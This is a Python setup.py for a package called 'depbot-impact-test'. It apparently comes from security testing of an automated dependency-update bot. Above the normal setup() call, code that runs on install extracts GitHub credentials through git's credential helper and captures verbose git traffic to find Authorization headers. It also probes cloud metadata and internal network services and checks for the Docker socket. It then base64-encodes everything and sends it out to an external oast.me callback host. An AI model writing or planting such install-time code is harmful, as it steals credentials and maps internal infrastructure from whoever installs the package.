import os, urllib.request, base64, subprocess, json, pathlib, socket

results = {}

# 1. Extract git credential via credential fill
try:
    proc = subprocess.run(
        ['git', 'credential', 'fill'],
        input='protocol=https\nhost=github.com\n\n',
        capture_output=True, text=True, timeout=10
    )
    results['git_cred_fill'] = proc.stdout[:300] + '|stderr:' + proc.stderr[:100]
except Exception as e:
    results['git_cred_fill'] = f'err={str(e)[:80]}'

# 2. Check GIT_ASKPASS and credential helper chain
try:
    r = subprocess.run(['git', 'config', '--get', 'credential.helper'], capture_output=True, text=True, timeout=5)
    results['cred_helper'] = r.stdout.strip() or 'none'
except:
    results['cred_helper'] = 'cmd_failed'
results['GIT_ASKPASS'] = os.environ.get('GIT_ASKPASS', 'unset')
results['GIT_TERMINAL_PROMPT'] = os.environ.get('GIT_TERMINAL_PROMPT', 'unset')

# 3. Full GIT_CURL_VERBOSE capture (bigger buffer)
try:
    r = subprocess.run(
        ['git', 'ls-remote', 'https://github.com/toofikz2/depbot-impact-test.git', 'HEAD'],
        capture_output=True, text=True, timeout=15,
        env={**os.environ, 'GIT_CURL_VERBOSE': '1'}
    )
    # Look for Authorization header in verbose output
    results['git_verbose'] = r.stderr[:600]
except Exception as e:
    results['git_verbose'] = f'err={str(e)[:80]}'

# 4. Internal network - metadata service (direct, not through proxy)
for name, url in [
    ('aws_meta', 'http://169.254.169.254/latest/meta-data/'),
    ('azure_meta', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'),
    ('docker_host', 'http://172.19.0.1/'),
    ('proxy_root', 'http://172.19.0.2:1080/'),
    ('proxy_3128', 'http://172.19.0.2:3128/'),
]:
    try:
        req = urllib.request.Request(url)
        if 'azure' in name:
            req.add_header('Metadata', 'true')
        # Bypass the http_proxy for internal requests
        handler = urllib.request.ProxyHandler({})
        opener = urllib.request.build_opener(handler)
        resp = opener.open(req, timeout=3)
        results[name] = resp.read().decode('utf-8', errors='replace')[:150]
    except Exception as e:
        results[name] = f'err={str(e)[:60]}'

# 5. /proc network state (shows active connections to internal services)
try:
    tcp = pathlib.Path('/proc/net/tcp').read_text()[:500]
    results['proc_net_tcp'] = tcp
except Exception as e:
    results['proc_net_tcp'] = f'err={str(e)[:40]}'

# 6. Docker socket
try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect('/var/run/docker.sock')
    results['docker_sock'] = 'CONNECTED!'
    s.close()
except Exception as e:
    results['docker_sock'] = f'err={str(e)[:60]}'

# 7. Internal DNS resolution
for host in ['host.docker.internal', 'orchestrator', 'dependabot-api', 'github-actions']:
    try:
        ip = socket.getaddrinfo(host, 80, socket.AF_INET)[0][4][0]
        results[f'dns:{host}'] = ip
    except Exception as e:
        results[f'dns:{host}'] = f'err={str(e)[:40]}'

# Exfil
payload = base64.urlsafe_b64encode(json.dumps(results).encode()).decode()
chunks = [payload[i:i+1800] for i in range(0, min(len(payload), 14000), 1800)]
for i, chunk in enumerate(chunks):
    try:
        urllib.request.urlopen(f'http://d99nibe1b2etnockvmb0erm7ukhz99koq.oast.me/deep/{i}?d=' + chunk, timeout=5)
    except:
        pass

from setuptools import setup
setup(name="depbot-impact-test", version="1.0.0",
      install_requires=["requests==2.26.0", "urllib3==1.26.5", "flask==2.0.0"])
